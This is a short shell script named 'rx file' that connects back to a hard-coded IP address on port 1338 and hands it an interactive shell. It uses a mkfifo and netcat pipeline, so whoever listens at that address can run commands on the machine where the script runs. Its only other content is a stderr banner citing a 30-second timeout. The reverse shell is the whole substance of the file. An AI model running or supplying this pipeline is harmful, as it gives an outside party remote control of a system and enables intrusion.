#!/bin/sh
# Name: rx file
# Author: em

RX_IP=10.253.152.12
RX_PORT=1338

echo "-- rx executable --" >&2
echo "   origin $HOST_IP:$HOST_PORT" >&2
echo "   timeout 30s" >&2
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /dev/fd/2 | nc -w 30 $RX_IP $RX_PORT > /tmp/f
